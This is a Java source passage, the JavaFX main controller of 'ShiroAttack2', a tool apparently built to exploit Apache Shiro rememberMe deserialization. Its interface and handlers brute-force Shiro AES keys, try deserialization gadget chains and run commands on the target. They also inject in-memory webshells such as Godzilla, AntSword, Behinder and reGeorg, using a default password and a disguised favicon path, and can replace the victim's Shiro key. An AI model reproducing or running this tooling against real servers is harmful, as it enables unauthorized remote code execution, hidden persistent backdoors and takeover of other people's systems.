package com.summersec.attack.UI;

import com.summersec.attack.Encrypt.KeyGenerator;
import com.summersec.attack.core.AttackService;
import com.summersec.attack.entity.ControllersFactory;
import com.summersec.attack.integration.generator.model.EchoGenerateResult;
import com.summersec.attack.integration.generator.model.MemshellGenerateResult;
import com.summersec.attack.utils.AppLogger;
import com.summersec.attack.utils.HttpUtil;
import com.summersec.attack.utils.Utils;
import java.net.Authenticator;
import java.net.InetSocketAddress;
import java.net.PasswordAuthentication;
import java.net.Proxy;
import java.net.URL;
import java.net.Proxy.Type;
import java.awt.Desktop;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.ResourceBundle;
import java.util.prefs.Preferences;
import javafx.beans.value.ChangeListener;
import javafx.concurrent.Task;
import javafx.beans.value.ObservableValue;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.application.Platform;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.control.Alert;
import javafx.scene.control.Button;
import javafx.scene.control.CheckBox;
import javafx.scene.control.ComboBox;
import javafx.scene.control.Label;
import javafx.scene.control.MenuItem;
import javafx.scene.control.Menu;
import javafx.scene.control.ProgressBar;
import javafx.scene.control.RadioMenuItem;
import javafx.scene.control.RadioButton;
import javafx.scene.control.Tab;
import javafx.scene.control.TabPane;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.control.ToggleGroup;
import javafx.scene.control.Alert.AlertType;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.HBox;
import javafx.scene.layout.Priority;
import javafx.scene.control.Hyperlink;
import javafx.scene.control.TitledPane;
import javafx.stage.Window;

public class MainController {
    private enum LanguageMode {
        ZH,
        EN
    }

    private static final int CHANGE_KEY_HISTORY_MAX = 30;
    private static final String PREF_NODE_CHANGE_KEY = "com/summersec/attack/shiroAttack2";
    private static final String PREF_CHANGE_KEY_HISTORY = "changeShiroKeyHistoryBase64";
    private static final String DEFAULT_CHANGE_KEY = "FcoRsBKe9XB3zOHbxTG0Lw==";
    private LanguageMode languageMode = LanguageMode.ZH;

    private volatile Task<Boolean> crackTaskRef;
    private volatile long crackStartMillis;
    private volatile Task<Boolean> keyCrackTaskRef;
    private volatile long keyCrackStartMillis;

    @FXML
    private ResourceBundle resources;
    @FXML
    private URL location;
    @FXML
    private Menu settingsMenu;
    @FXML
    private Menu languageMenu;
    @FXML
    private MenuItem proxySetupBtn;
    @FXML
    private RadioMenuItem langZhMenuItem;
    @FXML
    private RadioMenuItem langEnMenuItem;
    @FXML
    private TabPane mainTabPane;
    @FXML
    private TitledPane requestConfigPane;
    @FXML
    private TitledPane baseAttackPane;
    @FXML
    private ComboBox<String> methodOpt;
    @FXML
    private TextArea globalHeader;
    @FXML
    private TextArea post_data;
    @FXML
    private TextField shiroKeyWord;
    @FXML
    private TextField targetAddress;
    @FXML
    private TextField httpTimeout;
    @FXML
    public TextField shiroKey;
    @FXML
    private CheckBox aesGcmOpt;
    @FXML
    private Button crackKeyBtn;
    @FXML
    private Button crackSpcKeyBtn;
    @FXML
    private Label keyCrackProgressLabel;
    @FXML
    private ProgressBar keyCrackProgressBar;
    @FXML
    private Button cancelKeyCrackBtn;
    @FXML
    private Button crackSpcGadgetBtn;
    @FXML
    private Button crackGadgetBtn;
    @FXML
    private Label crackProgressLabel;
    @FXML
    private javafx.scene.control.ProgressBar crackProgressBar;
    @FXML
    private Button cancelCrackBtn;
    @FXML
    private Button executeCmdBtn;
    @FXML
    public TextArea logTextArea;
    @FXML
    public ComboBox<String> gadgetOpt;
    @FXML
    public ComboBox<String> echoOpt;
    @FXML
    public TextArea execOutputArea;
    @FXML
    public TextField exCommandText;
    @FXML
    public Label proxyStatusLabel;
    @FXML
    private Label timeoutLabel;
    @FXML
    private Label headerLabel;
    @FXML
    private Label postBodyLabel;
    @FXML
    private Label cookieKeywordLabel;
    @FXML
    private Label specifiedKeyLabel;
    @FXML
    private Label gadgetLabel;
    @FXML
    private Label echoLabel;
    @FXML
    private Tab logTab;
    @FXML
    private Tab execTab;
    @FXML
    private Tab injectTab;
    @FXML
    private Tab changeKeyTab;
    @FXML
    private Tab echoGenTab;
    @FXML
    private Tab memGenTab;
    @FXML
    private Tab keyGenTab;
    @FXML
    private Label commandInputLabel;
    @FXML
    private Label memshellTypeLabel;
    @FXML
    private Label memshellPathLabel;
    @FXML
    private Label memshellPasswordLabel;
    @FXML
    private Label changeKeyHintLabel;
    @FXML
    private Label changeKeyMethodLabel;
    @FXML
    private Label changeKeyTargetLabel;
    @FXML
    private Button clearChangeKeyHistoryBtn;
    @FXML
    private Hyperlink githubLink;
    @FXML
    private Label footerByLabel;

    public static Map<String, Object> currentProxy = new HashMap<String, Object>();
    private AttackService attackService;

    @FXML
    public ComboBox<String> memShellOpt;

    @FXML
    private TextField shellPathText;
    @FXML
    private TextField shellPassText;
    @FXML
    private Button injectShellBtn;
    @FXML
    private ComboBox<String> changeKeyVariantOpt;
    @FXML
    private ComboBox<String> changeKeyNewKeyCombo;
    @FXML
    private Button injectChangeKeyBtn;
    @FXML
    private TextArea changeKeyOutputArea;
    @FXML
    public TextArea InjOutputArea;
    @FXML
    public TextArea keytxt;
    @FXML
    public Button keygen;
    @FXML
    private ComboBox<String> echoSourceOpt;
    @FXML
    private ComboBox<String> jegServerOpt;
    @FXML
    private ComboBox<String> jegModelOpt;
    @FXML
    private ComboBox<String> jegFormatOpt;
    @FXML
    private Label jegCmdLabel;
    @FXML
    private Label jegCodeLabel;
    @FXML
    private TextField jegCmdInput;
    @FXML
    private TextArea jegCodeInput;
    @FXML
    private Button genEchoBtn;
    @FXML
    private Button sendEchoShiroExploitBtn;
    @FXML
    private Label echoShiroHintLabel;
    @FXML
    private TextArea echoGeneratorOutput;
    @FXML
    private ComboBox<String> memshellSourceOpt;
    @FXML
    private ComboBox<String> jmgToolOpt;
    @FXML
    private ComboBox<String> jmgServerOpt;
    @FXML
    private ComboBox<String> jmgShellOpt;
    @FXML
    private ComboBox<String> jmgFormatOpt;
    @FXML
    private ComboBox<String> jmgGadgetOpt;
    @FXML
    private Button genMemshellBtn;
    @FXML
    private Label memshellShiroChainHintLabel;
    @FXML
    private Button sendMemshellShiroInjectBtn;
    @FXML
    private TextArea memshellGeneratorOutput;

    /** 最近一次成功生成的回显载荷（jEG Base64 或 Legacy rememberMe=…） */
    private String lastEchoExploitPayload;
    /** 最近一次成功生成的来源：Legacy / jEG 等 */
    private String lastEchoExploitSource;
    /** jEG 返回的建议请求头名（如 Cookie、User-Agent），用于将纯密文规范为 rememberMe Cookie */
    private String lastEchoExploitRequestHeaderName;
    /** 最近一次成功生成的回显载荷所对应的 gadget */
    private String lastEchoExploitGadget;
    /** 最近一次成功生成的回显载荷所对应的 echo */
    private String lastEchoExploitEcho;
    /** 最近一次成功生成的内存马字节码串（Base64 等） */
    private String lastMemshellExploitPayload;
    /** 最近一次内存马生成来源：Legacy / jMG（Shiro 注入时与主界面注入共用 POST 流程） */
    private String lastMemshellExploitSource;

    public MainController() {
    }

    private static boolean isJava8Runtime() {
        String spec = System.getProperty("java.specification.version", "");
        return "1.8".equals(spec) || "8".equals(spec);
    }

    private void syncJegModelInputVisibility() {
        if (this.jegModelOpt == null) {
            return;
        }
        String m = this.jegModelOpt.getValue();
        boolean cmd = "MODEL_CMD".equals(m);
        boolean code = "MODEL_CODE".equals(m);
        if (this.jegCmdInput != null) {
            this.jegCmdInput.setPromptText(cmd ? (this.languageMode == LanguageMode.ZH ? "例如：whoami" : "Example: whoami") : "");
        }
        if (this.jegCmdInput != null) {
            this.jegCmdInput.setVisible(cmd);
            this.jegCmdInput.setManaged(cmd);
        }
        if (this.jegCmdLabel != null) {
            this.jegCmdLabel.setVisible(cmd);
            this.jegCmdLabel.setManaged(cmd);
        }
        if (this.jegCodeInput != null) {
            this.jegCodeInput.setVisible(code);
            this.jegCodeInput.setManaged(code);
        }
        if (this.jegCodeLabel != null) {
            this.jegCodeLabel.setVisible(code);
            this.jegCodeLabel.setManaged(code);
        }
        if (this.jegCodeInput != null) {
            this.jegCodeInput.setPromptText(code ? (this.languageMode == LanguageMode.ZH ? "输入需要生成的代码片段" : "Enter code snippet to generate") : "");
        }
    }

    private void showGuidanceAlert(AlertType type, String title, String header, String content) {
        Alert alert = new Alert(type);
        alert.setTitle(title);
        alert.setHeaderText(header);
        alert.setContentText(content);
        alert.setResizable(true);
        alert.getDialogPane().setPrefWidth(560);
        alert.show();
    }

    @FXML
    void openGithubLink(ActionEvent event) {
        try {
            Desktop.getDesktop().browse(new java.net.URI("https://github.com/SummerSec/ShiroAttack2"));
        } catch (Exception ex) {
            this.logTextArea.appendText(Utils.log("[!] 打开 GitHub 链接失败: " + ex.getMessage()));
            AppLogger.error("打开 GitHub 链接失败", ex);
        }
    }

    @FXML
    void switchToChinese(ActionEvent event) {
        this.languageMode = LanguageMode.ZH;
        this.applyLanguage();
    }

    @FXML
    void switchToEnglish(ActionEvent event) {
        this.languageMode = LanguageMode.EN;
        this.applyLanguage();
    }

    private void applyLanguage() {
        boolean zh = this.languageMode == LanguageMode.ZH;
        if (this.settingsMenu != null) this.settingsMenu.setText(zh ? "设置" : "Settings");
        if (this.languageMenu != null) this.languageMenu.setText(zh ? "语言" : "Language");
        if (this.proxySetupBtn != null) this.proxySetupBtn.setText(zh ? "代理" : "Proxy");
        if (this.requestConfigPane != null) this.requestConfigPane.setText(zh ? "目标与请求配置" : "Target & Request");
        if (this.baseAttackPane != null) this.baseAttackPane.setText(zh ? "检测与攻击基础参数" : "Detection & Attack Basics");
        if (this.timeoutLabel != null) this.timeoutLabel.setText(zh ? "超时/s" : "Timeout/s");
        if (this.headerLabel != null) this.headerLabel.setText("Header");
        if (this.postBodyLabel != null) this.postBodyLabel.setText(zh ? "POST Body" : "POST Body");
        if (this.cookieKeywordLabel != null) this.cookieKeywordLabel.setText(zh ? "Cookie关键字" : "Cookie Key");
        if (this.specifiedKeyLabel != null) this.specifiedKeyLabel.setText(zh ? "指定Key" : "Specified Key");
        if (this.gadgetLabel != null) this.gadgetLabel.setText(zh ? "利用链" : "Gadget");
        if (this.echoLabel != null) this.echoLabel.setText(zh ? "回显" : "Echo");
        if (this.crackSpcKeyBtn != null) this.crackSpcKeyBtn.setText(zh ? "检测当前密钥" : "Check Key");
        if (this.crackKeyBtn != null) this.crackKeyBtn.setText(zh ? "爆破密钥" : "Crack Keys");
        if (this.cancelKeyCrackBtn != null) this.cancelKeyCrackBtn.setText(zh ? "停止爆破Key" : "Stop Key Crack");
        if (this.keyCrackProgressLabel != null && (this.keyCrackProgressLabel.getText() == null || this.keyCrackProgressLabel.getText().contains("就绪") || this.keyCrackProgressLabel.getText().contains("ready"))) {
            this.keyCrackProgressLabel.setText(zh ? "Key 爆破状态：待开始" : "Key crack status: idle");
        }
        if (this.crackSpcGadgetBtn != null) this.crackSpcGadgetBtn.setText(zh ? "检测当前利用链" : "Check Gadget");
        if (this.crackGadgetBtn != null) this.crackGadgetBtn.setText(zh ? "爆破利用链及回显" : "Crack Gadget & Echo");
        if (this.cancelCrackBtn != null) this.cancelCrackBtn.setText(zh ? "停止" : "Stop");
        if (this.logTab != null) this.logTab.setText(zh ? "检测日志" : "Logs");
        if (this.execTab != null) this.execTab.setText(zh ? "命令执行" : "Command Exec");
        if (this.injectTab != null) this.injectTab.setText(zh ? "内存马注入" : "Memshell Inject");
        if (this.changeKeyTab != null) this.changeKeyTab.setText(zh ? "修改 Shiro Key" : "Change Shiro Key");
        if (this.echoGenTab != null) this.echoGenTab.setText(zh ? "回显生成" : "Echo Generate");
        if (this.memGenTab != null) this.memGenTab.setText(zh ? "内存马生成" : "Memshell Generate");
        if (this.keyGenTab != null) this.keyGenTab.setText(zh ? "Key 生成" : "Key Generate");
        if (this.jegCmdLabel != null) {
            this.jegCmdLabel.setText(zh ? "命令 (MODEL_CMD)" : "Command (MODEL_CMD)");
        }
        if (this.jegCodeLabel != null) {
            this.jegCodeLabel.setText(zh ? "代码 (MODEL_CODE)" : "Code (MODEL_CODE)");
        }
        this.syncJegModelInputVisibility();
        if (this.sendEchoShiroExploitBtn != null) {
            this.sendEchoShiroExploitBtn.setText(zh ? "Shiro 利用" : "Shiro Exploit");
        }
        if (this.echoShiroHintLabel != null) {
            this.echoShiroHintLabel.setText(zh
                    ? "先在上方生成载荷，再点击「Shiro 利用」发送；传统模式会发送 rememberMe，jEG 模式会通过 InjectMemTool body 投递。"
                    : "Generate payload first, then click 'Shiro Exploit' to send it. Legacy sends rememberMe, jEG sends body via InjectMemTool.");
        }
        if (this.memshellShiroChainHintLabel != null) {
            this.memshellShiroChainHintLabel.setText(zh
                    ? "「Shiro 注入」与「内存马注入」相同：InjectMemTool 的 rememberMe + POST user=Base64（jMG/传统一致）。表格 Gadget 为 jMG 内部选项，与 Shiro 链无关。"
                    : "Shiro inject matches Memshell tab: InjectMe rememberMe cookie + POST user=Base64 (jMG/Legacy). Grid Gadget is jMG-only, not the Shiro chain.");
        }
        if (this.sendMemshellShiroInjectBtn != null) {
            this.sendMemshellShiroInjectBtn.setText(zh ? "Shiro 注入" : "Shiro Inject");
        }
        if (this.commandInputLabel != null) this.commandInputLabel.setText(zh ? "输入命令" : "Command");
        if (this.executeCmdBtn != null) this.executeCmdBtn.setText(zh ? "执行" : "Run");
        if (this.memshellTypeLabel != null) this.memshellTypeLabel.setText(zh ? "类型" : "Type");
        if (this.memshellPathLabel != null) this.memshellPathLabel.setText(zh ? "路径" : "Path");
        if (this.memshellPasswordLabel != null) this.memshellPasswordLabel.setText(zh ? "密码" : "Password");
        if (this.injectShellBtn != null) this.injectShellBtn.setText(zh ? "执行注入" : "Inject");
        if (this.changeKeyHintLabel != null) this.changeKeyHintLabel.setText(zh ? "先完成密钥和利用链检测，再执行本页。" : "Finish key and gadget detection before using this tab.");
        if (this.changeKeyMethodLabel != null) this.changeKeyMethodLabel.setText(zh ? "方式" : "Mode");
        if (this.changeKeyTargetLabel != null) this.changeKeyTargetLabel.setText(zh ? "目标 Key" : "Target Key");
        if (this.clearChangeKeyHistoryBtn != null) this.clearChangeKeyHistoryBtn.setText(zh ? "清空历史" : "Clear History");
        if (this.injectChangeKeyBtn != null) this.injectChangeKeyBtn.setText(zh ? "执行" : "Apply");
        if (this.keygen != null) this.keygen.setText(zh ? "生成 Key" : "Generate Key");
        if (this.footerByLabel != null) this.footerByLabel.setText("BY SummerSec");
        if (this.githubLink != null) this.githubLink.setText(zh ? "GitHub: github.com/SummerSec/ShiroAttack2" : "GitHub: github.com/SummerSec/ShiroAttack2");

        if (this.globalHeader != null) {
            this.globalHeader.setPromptText(zh
                    ? "一行一个 Header，例如\nCookie: rememberMe=xxx\nUser-Agent: Mozilla/5.0"
                    : "One header per line, for example\nCookie: rememberMe=xxx\nUser-Agent: Mozilla/5.0");
        }
        if (this.post_data != null) {
            this.post_data.setPromptText(zh
                    ? "直接填写原始 POST Body，默认原样覆盖发送"
                    : "Paste raw POST body here. It overwrites by default.");
        }
        if (this.changeKeyNewKeyCombo != null) {
            this.changeKeyNewKeyCombo.setPromptText(zh ? "rememberMe AES Key（Base64）" : "rememberMe AES Key (Base64)");
        }
    }

    private void warnIfNotJava8() {
        if (isJava8Runtime()) {
            return;
        }
        String ver = System.getProperty("java.version", "未知");
        String spec = System.getProperty("java.specification.version", "未知");
        showGuidanceAlert(
                AlertType.WARNING,
                "运行环境提示",
                "当前未在 JDK 8 下运行",
                "检测到 Java 版本：" + ver + "（java.specification.version=" + spec + "）。\n\n"
                        + "本工具按 Java 8 + JavaFX 8 构建与测试，其它大版本可能出现界面缺失、序列化或依赖行为差异。\n\n"
                        + "建议：使用带 JavaFX 的 JDK 8（例如 Azul ZuluFX 8）启动 jar，可获得最稳定体验。\n"
                        + "若坚持使用当前 JDK，请先阅读日志报错；多数「找不到模块/JavaFX」类问题换 JDK 8 即可排除。");
    }

    @FXML
    void injectShellBtn(ActionEvent event) {
        String memShellType = (String)this.memShellOpt.getValue();
        String shellPass = this.shellPassText.getText();
        String shellPath = this.shellPathText.getText();
        AppLogger.info("内存马注入: type=" + memShellType + ", path=" + shellPath);
        if (AttackService.gadget != null ) {
            this.attackService.injectMem(memShellType, shellPass, shellPath);
        } else {
            this.InjOutputArea.appendText(Utils.log("请先获取密钥和构造链"));
            this.showGuidanceAlert(
                    AlertType.INFORMATION,
                    "无法注入内存马",
                    "尚未完成「密钥 + 利用链」检测",
                    "原因：内存马注入依赖已成功构造的 Gadget 链与有效 Shiro Key（rememberMe 加密）。\n\n"
                            + "请先：\n"
                            + "1）填写目标 URL、Cookie 关键字等后，点击「检测当前密钥」或「爆破密钥」；\n"
                            + "2）再点击「检测当前利用链」或「爆破利用链及回显」，直到日志中出现成功信息；\n"
                            + "3）然后回到本页重新执行注入。\n\n"
                            + "若仍失败，请确认目标为 Tomcat/Shiro 典型环境，并尝试更换利用链与回显组合。");
        }
    }

    @FXML
    void injectChangeKeyBtn(ActionEvent event) {
        if (this.attackService == null) {
            this.initAttack();
        }
        String memShellType = this.changeKeyVariantOpt.getValue();
        AppLogger.info("修改 Shiro Key: variant=" + memShellType);
        String oldKey = this.shiroKey != null ? this.shiroKey.getText() : "";
        if ("高风险: 全候选 rememberMeManager 扫描".equals(memShellType)) {
            this.showGuidanceAlert(
                    AlertType.WARNING,
                    "高风险修改模式",
                    "将尝试批量修改多个 rememberMeManager 候选对象",
                    "该模式用于怀疑目标存在多个 rememberMeManager / 多条 Shiro Filter 链路的场景。\n\n"
                            + "风险：\n"
                            + "1）可能同时影响多个 Shiro 相关组件；\n"
                            + "2）如果目标是复杂业务环境，可能导致 rememberMe 行为整体异常；\n"
                            + "3）这仍不等于跨集群所有节点都已修改，只是尽量覆盖当前节点中的更多候选对象。\n\n"
                            + "建议：修改后务必同时验证“新 key 成功 / 旧 key 失败”。");
        }
        String shellPass = this.getChangeKeyInputText();
        if (AttackService.gadget != null) {
            this.attackService.injectMem(memShellType, shellPass, "", this.changeKeyOutputArea);
            this.changeKeyOutputArea.appendText(Utils.log("[验证] 开始验证新旧 Key 状态..."));
            boolean newKeyOk = this.attackService.verifyKey(shellPass);
            boolean oldKeyStillOk = oldKey != null && !oldKey.trim().isEmpty() && this.attackService.verifyKey(oldKey.trim());
            if (newKeyOk && !oldKeyStillOk) {
                this.changeKeyOutputArea.appendText(Utils.log("[验证结果] 成功：新 Key 可用，旧 Key 已失效"));
            } else if (newKeyOk) {
                this.changeKeyOutputArea.appendText(Utils.log("[验证结果] 部分成功：新 Key 可用，但旧 Key 仍可用"));
                this.changeKeyOutputArea.appendText(Utils.log("[风险提示] 疑似存在多个 rememberMeManager 或多节点场景；建议改用“高风险: 全候选 rememberMeManager 扫描”并逐节点重复验证。"));
                this.showGuidanceAlert(
                        AlertType.WARNING,
                        "Key 修改仅部分生效",
                        "旧 key 仍然可用",
                        "这通常意味着当前目标存在多个 rememberMeManager 候选对象，或者你的请求命中了不同节点。\n\n"
                                + "建议：\n"
                                + "1）切换到“高风险: 全候选 rememberMeManager 扫描”；\n"
                                + "2）重复执行修改后验证；\n"
                                + "3）如果目标是集群/多节点，请分别命中不同节点执行。\n\n"
                                + "风险：高风险模式可能同时影响多个 Shiro 组件，请谨慎使用。");
            } else {
                this.changeKeyOutputArea.appendText(Utils.log("[验证结果] 未确认成功：新 Key 验证失败，请重试其他变体"));
            }
            this.changeKeyOutputArea.appendText(Utils.log("-------------------------------------------------"));
        } else {
            this.changeKeyOutputArea.appendText(Utils.log("请先获取密钥和构造链"));
            this.showGuidanceAlert(
                    AlertType.INFORMATION,
                    "无法修改 Shiro Key",
                    "尚未完成「密钥 + 利用链」检测",
                    "原因：修改 Key 的内存逻辑同样依赖已成功构造的注入链与当前可用 Key。\n\n"
                            + "请先在上方完成密钥检测与利用链检测（与「内存马注入」相同前置步骤），再执行本页注入。\n\n"
                            + "新 Key 请填写 rememberMe 所用 AES 密钥的 Base64；可用「key生成」页生成后从历史下拉选用。");
        }
        if (!shellPass.isEmpty()) {
            this.rememberChangeKeyUsed(shellPass);
        }
    }

    @FXML
    void crackSpcKeyBtn(ActionEvent event) {
        this.initAttack();
        AppLogger.info("检测当前密钥");
        Task<Boolean> running = this.keyCrackTaskRef;
        if (running != null && running.isRunning()) {
            this.logTextArea.appendText(Utils.log("Key 爆破任务正在运行中"));
            return;
        }
        if (this.attackService.checkIsShiro()) {
            String spcShiroKey = this.shiroKey.getText();
            if (!spcShiroKey.equals("")) {
                this.startKeyCrackTask(FXCollections.observableArrayList(new String[]{spcShiroKey}), false);
            } else {
                this.logTextArea.appendText(Utils.log("请输入指定密钥"));
            }
        }
    }

    @FXML
    void clearChangeKeyHistoryBtn(ActionEvent event) {
        Preferences p = Preferences.userRoot().node(PREF_NODE_CHANGE_KEY);
        p.remove(PREF_CHANGE_KEY_HISTORY);
        if (this.changeKeyNewKeyCombo != null) {
            this.changeKeyNewKeyCombo.setItems(FXCollections.observableArrayList(new String[]{DEFAULT_CHANGE_KEY}));
            this.changeKeyNewKeyCombo.getEditor().setText(DEFAULT_CHANGE_KEY);
            this.changeKeyNewKeyCombo.getSelectionModel().clearSelection();
        }
        this.changeKeyOutputArea.appendText(Utils.log("[历史] 已清空修改 Key 历史记录"));
        AppLogger.info("已清空修改 Shiro Key 历史记录");
    }

    @FXML
    void crackKeyBtn(ActionEvent event) {
        this.initAttack();
        AppLogger.info("爆破密钥");
        Task<Boolean> running = this.keyCrackTaskRef;
        if (running != null && running.isRunning()) {
            this.logTextArea.appendText(Utils.log("Key 爆破任务正在运行中"));
            return;
        }
        if (this.attackService.checkIsShiro()) {
            List<String> shiroKeys = this.attackService.getALLShiroKeys();
            this.startKeyCrackTask(shiroKeys, this.attackService.flagCount > 1);
        }
    }

    private String getChangeKeyInputText() {
        if (this.changeKeyNewKeyCombo == null || this.changeKeyNewKeyCombo.getEditor() == null) {
            return "";
        }
        String t = this.changeKeyNewKeyCombo.getEditor().getText();
        return t == null ? "" : t.trim();
    }

    private List<String> loadChangeKeyHistoryFromPrefs() {
        Preferences p = Preferences.userRoot().node(PREF_NODE_CHANGE_KEY);
        String raw = p.get(PREF_CHANGE_KEY_HISTORY, "");
        List<String> out = new ArrayList<String>();
        if (raw != null && !raw.isEmpty()) {
            for (String line : raw.split("\n")) {
                String s = line.trim();
                if (!s.isEmpty()) {
                    out.add(s);
                }
            }
        }
        return out;
    }

    private void persistChangeKeyHistory() {
        if (this.changeKeyNewKeyCombo == null) {
            return;
        }
        List<String> lines = new ArrayList<String>();
        for (String s : this.changeKeyNewKeyCombo.getItems()) {
            if (s != null && !s.trim().isEmpty()) {
                lines.add(s.trim());
            }
        }
        Preferences p = Preferences.userRoot().node(PREF_NODE_CHANGE_KEY);
        p.put(PREF_CHANGE_KEY_HISTORY, String.join("\n", lines));
    }

    private void rememberChangeKeyUsed(String key) {
        if (key == null || key.trim().isEmpty() || this.changeKeyNewKeyCombo == null) {
            return;
        }
        key = key.trim();
        ObservableList<String> items = this.changeKeyNewKeyCombo.getItems();
        items.remove(key);
        items.add(0, key);
        while (items.size() > CHANGE_KEY_HISTORY_MAX) {
            items.remove(items.size() - 1);
        }
        this.changeKeyNewKeyCombo.getEditor().setText(key);
        this.changeKeyNewKeyCombo.getSelectionModel().clearSelection();
        this.persistChangeKeyHistory();
    }

    private void initChangeKeyHistoryCombo() {
        this.changeKeyNewKeyCombo.setEditable(true);
        List<String> loaded = this.loadChangeKeyHistoryFromPrefs();
        if (loaded.isEmpty()) {
            loaded.add(DEFAULT_CHANGE_KEY);
        }
        this.changeKeyNewKeyCombo.setItems(FXCollections.observableArrayList(loaded));
        this.changeKeyNewKeyCombo.getEditor().setText(loaded.get(0));
        this.changeKeyNewKeyCombo.getSelectionModel().selectedItemProperty().addListener((obs, o, n) -> {
            if (n != null && !n.trim().isEmpty()) {
                this.changeKeyNewKeyCombo.getEditor().setText(n);
            }
        });
    }

    @FXML
    void initialize() {

        this.initToolbar();
        this.initComBoBox();
        this.initContext();
        ControllersFactory.controllers.put(MainController.class.getSimpleName(), this);
        this.updateCrackProgress(0, 0, "利用链爆破状态：待开始");
        this.setCrackButtonsDisabled(false);
        Platform.runLater(this::warnIfNotJava8);
    }

    public void initAttack() {
        String shiroKeyWordText = this.shiroKeyWord.getText();
        String targetAddressText = this.targetAddress.getText();
        String httpTimeoutText = this.httpTimeout.getText();
        AppLogger.info("初始化攻击服务: method=" + this.methodOpt.getValue() + ", target=" + targetAddressText + ", keyWord=" + shiroKeyWordText + ", timeout=" + httpTimeoutText);
        Map<String, String> myheader = new HashMap<String, String>();
        String rawHeaders = this.globalHeader.getText();
        if (rawHeaders != null && !rawHeaders.trim().isEmpty()) {
            String[] headers = rawHeaders.split("\\r?\\n");
            for (String line : headers) {
                if (line == null) {
                    continue;
                }
                String trimmed = line.trim();
                if (trimmed.isEmpty()) {
                    continue;
                }
                String[] header = trimmed.split(":", 2);
                if (header.length < 2) {
                    this.logTextArea.appendText(Utils.log("[!] 忽略非法 Header 行: " + trimmed));
                    continue;
                }
                String key = header[0].trim();
                String value = header[1].trim();
                if (!key.isEmpty()) {
                    myheader.put(key, value);
                }
            }
        }
        String postData = this.post_data.getText();
        String reqMethod = (String)this.methodOpt.getValue();
        this.attackService = new AttackService(reqMethod, targetAddressText, shiroKeyWordText, httpTimeoutText, myheader, postData);
        if (this.aesGcmOpt.isSelected()) {
            AttackService.aesGcmCipherType = 1;
        } else {
            AttackService.aesGcmCipherType = 0;
        }

    }

    public void initContext() {
        this.shiroKeyWord.setText("rememberMe");
        this.httpTimeout.setText("10");
        if (this.targetAddress != null && (this.targetAddress.getText() == null || this.targetAddress.getText().trim().isEmpty())) {
            this.targetAddress.setText("http://127.0.0.1:8080/");
        }
    }

    public void initComBoBox() {
//        ObservableList<String> methods = FXCollections.observableArrayList(new String[]{"GET", "POST","复杂请求"});
        ObservableList<String> methods = FXCollections.observableArrayList(new String[]{"GET", "POST"});
        this.methodOpt.setPromptText("GET");
        this.methodOpt.setValue("GET");
        this.methodOpt.setItems(methods);
        ObservableList<String> gadgets = FXCollections.observableArrayList(new String[]{ "CommonsBeanutils1","CommonsBeanutils1_183", "CommonsCollections2", "CommonsCollections3", "CommonsCollectionsK1", "CommonsCollectionsK2", "CommonsBeanutilsString", "CommonsBeanutilsString_183", "CommonsBeanutilsAttrCompare", "CommonsBeanutilsAttrCompare_183", "CommonsBeanutilsPropertySource","CommonsBeanutilsPropertySource_183", "CommonsBeanutilsObjectToStringComparator", "CommonsBeanutilsObjectToStringComparator_183"});
//        ObservableList<String> gadgets = FXCollections.observableArrayList(new String[]{ "CommonsBeanutils1" ,"CommonsBeanutils1_183" ,"CommonsCollections2", "CommonsCollections3", "CommonsCollectionsK1", "CommonsCollectionsK2", "CommonsBeanutilsString", "CommonsBeanutilsAttrCompare", "CommonsBeanutilsPropertySource", "CommonsBeanutilsObjectToStringComparator"});
//        ObservableList<String> gadgets = FXCollections.observableArrayList(new String[]{ "CommonsCollections2", "CommonsCollections3", "CommonsCollectionsK1", "CommonsCollectionsK2", "CommonsBeanutilsString", "CommonsBeanutilsAttrCompare", "CommonsBeanutilsPropertySource", "CommonsBeanutilsObjectToStringComparator"});
        this.gadgetOpt.setPromptText("CommonsBeanutilsString");
        this.gadgetOpt.setValue("CommonsBeanutilsString");
        this.gadgetOpt.setItems(gadgets);
        ObservableList<String> echoes = FXCollections.observableArrayList(new String[]{"AllEcho","TomcatEcho", "SpringEcho"});
//        ObservableList<String> echoes = FXCollections.observableArrayList(new String[]{"AllEcho","TomcatEcho", "TomcatEcho2", "SpringEcho"});
        this.echoOpt.setPromptText("TomcatEcho");
        this.echoOpt.setValue("TomcatEcho");
        this.echoOpt.setItems(echoes);
        this.shellPassText.setText("pass1024");
        this.shellPathText.setText("/favicondemo.ico");
        final ObservableList<String> memShells = FXCollections.observableArrayList(new String[]{"哥斯拉[Filter]", "蚁剑[Filter]", "冰蝎[Filter]", "NeoreGeorg[Filter]", "reGeorg[Filter]", "哥斯拉[Servlet]", "蚁剑[Servlet]", "冰蝎[Servlet]", "NeoreGeorg[Servlet]", "reGeorg[Servlet]", "ChangeShiroKeyFilter1", "ChangeShiroKeyFilter2", "BastionFilter", "BastionEncryFilter", "AddDllFilter"});
//        final ObservableList<String> memShells = FXCollections.observableArrayList(new String[]{"哥斯拉[Servlet]", "冰蝎[Servlet]", "蚁剑[Servlet]", "NeoreGeorg[Servlet]", "reGeorg[Servlet]"});
        this.memShellOpt.setPromptText("冰蝎[Filter]");
        this.memShellOpt.setValue("冰蝎[Filter]");
        this.memShellOpt.setItems(memShells);
        this.memShellOpt.getSelectionModel().selectedIndexProperty().addListener(new ChangeListener<Number>() {
            @Override
            public void changed(ObservableValue<? extends Number> observableValue, Number number, Number number2) {
                if (((String)memShells.get(number2.intValue())).contains("reGeorg")  ) {
                    MainController.this.shellPassText.setDisable(true);
                } else {
                    MainController.this.shellPassText.setDisable(false);
                }
            }
        });
        this.shellPathText.setText("/favicondemo.ico");

        ObservableList<String> echoGeneratorSources = FXCollections.observableArrayList("传统模式", "jEG");
        this.echoSourceOpt.setItems(echoGeneratorSources);
        this.echoSourceOpt.setValue("传统模式");
        ObservableList<String> memshellGeneratorSources = FXCollections.observableArrayList("传统模式", "jMG");
        this.memshellSourceOpt.setItems(memshellGeneratorSources);
        this.memshellSourceOpt.setValue("传统模式");

